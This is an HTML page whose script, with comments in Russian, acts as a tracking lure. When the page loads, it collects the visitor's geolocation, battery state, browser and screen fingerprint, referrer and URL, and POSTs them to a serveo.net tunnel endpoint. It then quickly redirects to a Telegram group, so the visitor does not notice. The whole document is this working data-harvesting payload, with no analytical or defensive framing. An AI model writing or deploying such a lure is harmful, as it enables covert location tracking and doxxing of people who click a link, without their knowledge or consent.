<!DOCTYPE html>
<html>
<head>
  <title>Script</title>
</head>
<body>
  <script>
    // Функция для получения данных о батарее
    function getBatteryInfo() {
      return navigator.getBattery().then(function(battery) {
        return {
          charging: battery.charging,
          level: battery.level * 100 + '%',
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
      });
    }

    // Функция для проверки доступности геолокации
    function checkGeolocationSupport() {
      return 'geolocation' in navigator;
    }

    // Функция для отправки данных на сервер
    function sendData(position, batteryInfo) {
      // Формирование объекта данных
      const data = {
        userAgent: navigator.userAgent,
        referrer: document.referrer,
        screenWidth: screen.width,
        screenHeight: screen.height,
        colorDepth: screen.colorDepth,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        cookieEnabled: navigator.cookieEnabled,
        platform: navigator.platform,
        onlineStatus: navigator.onLine,
        currentURL: window.location.href,
        battery: batteryInfo
      };

      // Если геолокация доступна и разрешена, добавляем её в данные
      if (position) {
        data.location = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy
        };
      } else {
        data.location = {
          latitude: 'N/A',
          longitude: 'N/A',
          accuracy: 'N/A'
        };
      }

      // Отправка данных на сервер
      fetch('https://d8ddeb652cdbf662bd7b916fe7287cae.serveo.net/collect', {
        method: 'POST',
        body: JSON.stringify(data),
        headers: { 'Content-Type': 'application/json' }
      });

      // Редирект на реальную группу
      setTimeout(function() {
        window.location.href = 'https://t.me/unixgnutgk';
      }, 100);
    }

    // Попробуем получить местоположение, если оно доступно
    function attemptToGetLocation() {
      if (checkGeolocationSupport()) {
        navigator.geolocation.getCurrentPosition(
          function(position) {
            // Если геолокация доступна, получаем данные о батарее и отправляем данные
            getBatteryInfo().then(function(batteryInfo) {
              sendData(position, batteryInfo);
            });
          },
          function(error) {
            // Если геолокация не доступна или не разрешена, отправляем только данные о батарее
            getBatteryInfo().then(function(batteryInfo) {
              sendData(null, batteryInfo);
            });
          }
        );
      } else {
        // Если геолокация не поддерживается, отправляем только данные о батарее
        getBatteryInfo().then(function(batteryInfo) {
          sendData(null, batteryInfo);
        });
      }
    }

    // Попробуем получить местоположение и отправить данные
    attemptToGetLocation();
  </script>
</body>
</html>
